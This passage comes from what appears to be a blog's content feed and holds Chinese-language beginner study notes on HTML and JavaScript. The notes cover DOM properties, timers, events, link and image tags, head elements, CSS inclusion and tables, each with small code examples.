class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方框勾选</span></span><br><span class="line">&lt;input type=<span class="string">&quot;checkbox&quot;</span> name = <span class="string">&quot;&quot;</span> id = <span class="string">&quot;&quot;</span> checked&gt;</span><br><span class="line"><span class="comment">// 禁用点击</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">disabled</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> ipt = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ipt.<span class="property">checked</span> = <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">button.<span class="property">disabled</span> = <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ipt.<span class="property">checked</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>如果我们这里写的是 <code>ipt.checked = &#39;true&#39;</code>， 仍然会改变成true，因为非空、0的字符串默认认定为true。但是并不提倡这么写，不规范</li></ul></li><li><p><strong>自定义属性</strong>  </p><p>上面都是标准属性，即标签自带的属性，如class、id、title等，通常我们会自定义一些属性</p><ul><li>自定义属性要求<strong>以 <code>data-</code> 开头</strong>，在DOM对象上以 <code>dataset. + 删除掉data-的后面部分 </code> 对象来获取</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义属性data-id，在后面通过dataset.id来获取</span></span><br><span class="line">&lt;div data-id = <span class="string">&#x27;10&#x27;</span>&gt;盒子&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">dataset</span>.<span class="property">id</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><h2 id="定时器（间歇函数）"><a href="#定时器（间歇函数）" class="headerlink" title="定时器（间歇函数）"></a>定时器（间歇函数）</h2><p>定时器面向的功能：需要每隔一段时间自动执行一段代码，不需要手动去触发</p><p>例如：网页中的倒计时。</p><ol><li><p><strong>开启定时器</strong></p><p>语法：setInterval(函数，间隔时间)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接使用函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>,<span class="title function_">log</span>(<span class="string">&#x27;一秒执行一次&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>(fn,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用匿名函数</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;一秒钟执行一次&#x27;</span>)</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><ul><li>注意这里是在过了间隔时间后才第一次执行函数，并不是立即执行一次，然后过了间隔时间后再执行第二次</li><li>函数名字不需要加括号</li><li>定时器返回的是一个id数字，表示这是第几个定时器（页面中可能设置了多个定时器）</li></ul></li><li><p><strong>关闭定时器</strong></p><p>语法：clearInterval(定时器id)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="built_in">setInterval</span>(fn,<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">clearInterval</span>(m)</span><br></pre></td></tr></table></figure></li></ol><h2 id="DOM事件"><a href="#DOM事件" class="headerlink" title="DOM事件"></a>DOM事件</h2><ol><li><p><strong>基本概念</strong></p><ul><li><strong>什么是事件</strong>：编程时系统内发生的动作或者发生的事情，比如用户在网页上单击一个按钮、图像加载完成、鼠标移动到元素上、输入字段被改变等</li><li><strong>事件监听</strong>：检测是否有时间发生，一旦触发事件，立即调用一个函数做出响应</li></ul></li><li><p><strong>添加事件监听（绑定）</strong></p><p>语法：元素对象.addEventListener(‘事件类型’, 要执行的函数)</p><ul><li>事件类型：事件用什么方式触发，如鼠标单击click、鼠标经过mouseover等</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, myFunction)</span><br></pre></td></tr></table></figure></li><li><p><strong>事件类型</strong></p><ul><li><p>鼠标事件</p><ul><li>鼠标点击：click</li><li>鼠标经过：mouseenter</li><li>鼠标离开：mouseleave</li></ul></li><li><p>焦点事件</p><ul><li>获得焦点：focus</li><li>失去焦点：blur</li></ul><blockquote><p>注意和点击的区别，例如搜索框，鼠标点击后出现下拉框，离开就消失，这种就是得到鼠标+失去鼠标，为焦点事件</p></blockquote></li><li><p>键盘事件</p><ul><li>键盘按下：Keydown</li><li>键盘抬起：Keyup</li></ul></li><li><p>文本事件</p><ul><li>用户输入事件：input</li></ul></li></ul></li><li><p><strong>事件对象</strong></p></li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>map函数遍历数组：<a href="https://blog.csdn.net/qq_23366033/article/details/112036077">JavaScript中的map()方法详解（均采用es6语法）</a></p><h1 id="功能案例"><a href="#功能案例" class="headerlink" title="功能案例"></a>功能案例</h1><h2 id="1-同意协议倒计时"><a href="#1-同意协议倒计时" class="headerlink" title="1. 同意协议倒计时"></a>1. 同意协议倒计时</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=decive-width, initial-scale=1&quot; &gt;</span><br><span class="line">    &lt;title&gt;案例1：同意协议倒计时&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;</span><br><span class="line">        用户注册协议</span><br><span class="line">        欢迎注册成为微博用户，请你仔细阅读并同意一下用户协议</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button class=&quot;btn&quot; disabled&gt;我已经阅读用户协议（5）&lt;/button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const btn = document.querySelector(&#x27;.btn&#x27;)</span><br><span class="line">        let i = 5</span><br><span class="line">        let n = setInterval(function()&#123;</span><br><span class="line">            i -- </span><br><span class="line">            btn.innerHTML = `我已经阅读用户协议（$&#123;i&#125;）`</span><br><span class="line">            if (i==0) &#123;</span><br><span class="line">                clearInterval(n)</span><br><span class="line">                btn.disabled = false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,1000)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-轮播图"><a href="#2-轮播图" class="headerlink" title="2. 轮播图"></a>2. 轮播图</h2><p>见视频P97、98</p><h2 id="3-发布评论"><a href="#3-发布评论" class="headerlink" title="3. 发布评论"></a>3. 发布评论</h2><p>见视频P99</p>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』HTML学习</title>
      <link href="/posts/4b93.html"/>
      <url>/posts/4b93.html</url>
      
        <content type="html"><![CDATA[<p>本文主要记录对HTML基础知识的学习，主要内容基于 <a href="https://www.runoob.com/html/html-tutorial.html">HTML 教程 | 菜鸟教程</a></p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>定义</strong></p><p>HTML 是指超文本标记语言，它是一套用来描述网页的标记标签。HTML 文档包含了 HTML 标签及文本内容，也就是我们常说的 web 页面。 </p></li><li><p><strong>HTML文档的基本结构</strong></p><p>由声明+头部+body组成</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710163159973.png" alt="image-20240710163159973"></p></li></ol><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><p>这里指的是body中的标签和元素</p><ol><li><p><strong>标签和元素的区别</strong></p><p>标签</p><ul><li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li><li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code></li><li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li></ul><p>元素</p><ul><li><p>元素即为包括标签和内容的部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--这个整体为元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">标签</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>常见的四个标签</strong></p></li></ol><p>（1）<code>&lt;h1&gt;-&lt;h6&gt;</code> 用于定义HTML标题</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--标题--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</li></ul><p>（2）<code>&lt;p&gt;</code> 标签用于定义段落</p><p>使用该标签，文本内容结束后会自动换行，行之间存在一些间距</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--段落--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;br&gt;</code> 标签用于在文本中创建换行。他和 <code>&lt;p&gt;</code>  标签的区别就在于它只是文本中创建简单的换行，并不是新的段落，换行之间并没有一定的空白。</p></blockquote><p>（3）<code>&lt;a&gt;</code> 标签用于链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--链接--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>&lt;a&gt;</code> 的常见属性</p><ul><li><p><code>href</code>：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。</p></li><li><p><code>target</code>（可选）：指定链接如何在浏览器中打开。常见的值包括 <code>_blank</code>（在新标签或窗口中打开链接）和 <code>_self</code>（在当前标签或窗口中打开链接）。</p></li><li><p><code>title</code>（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。</p></li><li><p><code>rel</code>（可选）：表示<u>链接文档与当前文档的关系</u></p><ul><li><code>rel=&quot;stylesheet&quot;</code> ：表示被链接的文档是一个样式表文件，用于页面的样式定义。</li><li><code>rel=&quot;icon&quot;</code> ：表示被链接的文档是一个图标文件，通常用于网站的 favicon。</li><li><code>rel=&quot;nofollow</code>：指示搜索引擎不应该跟踪被链接的页面，通常用于防止无关链接对搜索引擎排名的干扰</li><li><code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>：用来增强安全性。<code>rel=&quot;noopener&quot;</code> 通知浏览器在新标签页打开时不应让新页面访问 opener 对象，从而防止恶意页面通过 opener 访问原始页面。<code>rel=&quot;noreferrer&quot;</code> 类似，还会阻止传递 referrer 信息。</li></ul></li></ul></li><li><p>除了文本内容、图片或其他HTML元素都可以成为链接</p><ul><li><p><strong>文本链接</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问示例网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>图像链接</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>**锚点链接：**除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <code>&lt;a&gt;</code> 元素定义一个标记，并使用 # 符号引用该标记。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section2&quot;</span>&gt;</span>跳转到第二部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在页面中的某个位置 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里可以用name属性也可以用id属性等 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;section2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也可以从其他HTML页面创建链接直接指向这里</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com/html/html-links.html#section2&quot;</span>&gt;</span></span><br><span class="line">访问有用的提示部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>**下载链接：**如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>（4）<strong>图像</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--图像--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/logo.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;258&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>img</code> 标签的常见属性<ul><li><code>src</code> ：图像的 URL 地址</li><li><code>alt</code> ： 替代性文本。在浏览器无法载入图像时，浏览器将显示这个替代性的文本。</li><li><code>width=&quot;304&quot; height=&quot;228&quot;</code>：指定图像的高度和宽度，单位像素。</li></ul></li></ul><ol start="3"><li><p><strong>其他标签</strong></p><ul><li><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线，用于分隔内容，单标签，不需要闭合。</li><li><code>&lt;br&gt;</code> 标签用于在文本中创建换行。单标签，不需要闭合。</li><li><code>&lt;div&gt;</code>：属于块级标签，独占一行，可以设置宽度、高度以及边距等样式属性。<ul><li>它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。</li><li><strong>可以容纳其他块级元素和行内元素</strong>，包括其他的 <code>&lt;div&gt;</code> 和 <code>&lt;span&gt;</code> 元素。</li></ul></li><li><code>&lt;span&gt;</code>：内联元素，可用作文本的容器，对部分文本进行更精细的CSS制定</li></ul></li><li><p><strong>格式化标签</strong></p><p>即加粗、上标、下标等特殊的字体格式标签</p><p><a href="https://www.runoob.com/html/html-formatting.html">HTML文本格式化|菜鸟教程</a></p></li></ol><h1 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h1><ol><li><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。</p><ul><li><p><strong>块级元素</strong>：在浏览器显示时，通常会以新行来开始（和结束）。</p><ul><li>实例： <code>&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</code></li></ul></li><li><p><strong>内联元素</strong>：在显示时，不会以新行开始</p><ul><li>实例：<code>&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</code></li></ul></li></ul></li><li></li></ol><h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><ol><li><p><strong>什么是属性</strong></p><ul><li><p>HTML 元素可以设置<strong>属性</strong></p></li><li><p>属性可以在元素中添加<strong>附加信息</strong></p></li><li><p>属性一般描述于<strong>开始标签</strong></p></li><li><p>属性总是以名称&#x2F;值对的形式出现，比如：name&#x3D;”value”。（属性推荐使用小写）</p><blockquote><p>链接标签中的 <code>href</code> 就是属性</p></blockquote></li></ul></li><li><p><strong>常见的属性类型</strong></p><table><thead><tr><th>class</th><th>为html元素定义一个或多个类名（classname）(类名从样式文件引入)</th></tr></thead><tbody><tr><td>id</td><td>定义元素的唯一id</td></tr><tr><td>style</td><td>规定元素的行内样式（inline style）</td></tr><tr><td>title</td><td>描述了元素的额外信息 (作为工具条使用)</td></tr></tbody></table><ul><li>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用。</li></ul><blockquote><ul><li><p><strong>class和style的区别</strong></p><p><code>class</code>属性主要用于引用外部或内部样式表中定义的样式类，从而<strong>实现样式的复用和统一管理</strong>；而<code>style</code>属性则<strong>直接为单个元素指定内联样式</strong>，适用于需要特定样式的情况。</p></li><li><p><strong>class和id</strong></p><p>注意在 HTML 中，<code>id</code> 属性必须是唯一的。每个元素的 <code>id</code> 值在整个文档中都应该是唯一的，以确保正确的标识和引用。如果需要为多个元素应用相同的样式或进行相同的操作，建议使用 <code>class</code> 属性。</p></li></ul></blockquote></li></ol><h1 id="HTML头部"><a href="#HTML头部" class="headerlink" title="HTML头部"></a>HTML头部</h1><p><code>&lt;head&gt;</code>元素包含了所有的头部标签元素。在 <code>&lt;head&gt;</code> 元素中你可以插入<strong>脚本（scripts）, 样式文件（CSS），及各种meta信息</strong>。</p><p>可以添加在头部区域的元素标签包括: <code>&lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;</code>。</p><ol><li><p><code>&lt;title&gt;</code> 元素：定义了网页标题</p></li><li><p><code>&lt;base&gt;</code> 元素：定义了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>&lt;link&gt;</code> 元素：定义了文档与外部资源之间的关系，通常用于链接到样式表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>其中 <code>href</code> 属性指定了外部样式表的路径</li><li></li></ul></li><li><p><code>&lt;style&gt;</code>元素：定义了HTML文档的样式文件引用地址，在该元素中你也可以直接添加样式来渲染 HTML 文档</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>:yellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>:blue</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>这里的 <code>&lt;style&gt;</code> 标签和前面说到的 style 属性又有什么区别呢</strong></p><ul><li><code>&lt;style&gt;</code>元素用于在<code>&lt;head&gt;</code>标签内定义整体或特定部分的样式表，适用于页面级别的样式管理。相对于CSS并不能引入外部样式表</li><li>而<code>style</code>属性用于直接在HTML标签内定义特定元素的行内样式，适用于局部的样式设置，具有更高的优先级。</li></ul></blockquote></li><li><p><code>meta</code> 元素：定义一些基本的元数据</p><p>为搜索引擎定义关键词:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</span><br></pre></td></tr></table></figure><p>为网页定义描述内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</span><br></pre></td></tr></table></figure><p>定义网页作者:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</span><br></pre></td></tr></table></figure><p>每30秒钟刷新当前页面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>&lt;script&gt;</code> 元素：加载脚本文件，如js</p></li></ol><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><ol><li><p><strong>定义</strong>：给HTML元素添加样式，可以更好地渲染元素</p><p>CSS 可以通过以下方式添加到HTML中:</p><ul><li><p>内联样式：在HTML元素中使用”style” <strong>属性</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:blue;margin-left:20px;&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内部样式表：在HTML文档头部 <code>&lt;head&gt;</code> 区域使用 <code>&lt;style&gt;</code> <strong>元素</strong> 来包含CSS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>外部引用：使用外部 CSS <strong>文件</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>最好的方式是通过外部引用CSS文件。</p></li></ol><h1 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h1><ol><li><p><strong>定义</strong></p><p>HTML 表格由 <code>&lt;table&gt;</code> 标签来定义。包括tr、td、th三个标签：</p><ul><li><p><strong>tr</strong>：tr 是 table row 的缩写，表示表格的一行。</p></li><li><p><strong>td</strong>：td 是 table data 的缩写，表示表格的数据单元格。</p></li><li><p><strong>th</strong>：th 是 table header的缩写，表示表格的表头单元格。通过使用 <code>&lt;th&gt;</code> 元素定义列标题，可以使其在表格中以粗体显示，与普通单元格区分开来。</p></li><li><p><strong><code>&lt;thead&gt;</code></strong> ：用于定义表格的标题部分</p></li><li><p>**<code>&lt;tbody&gt;</code>  **：用于定义表格的主体部分</p></li></ul></li><li><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td 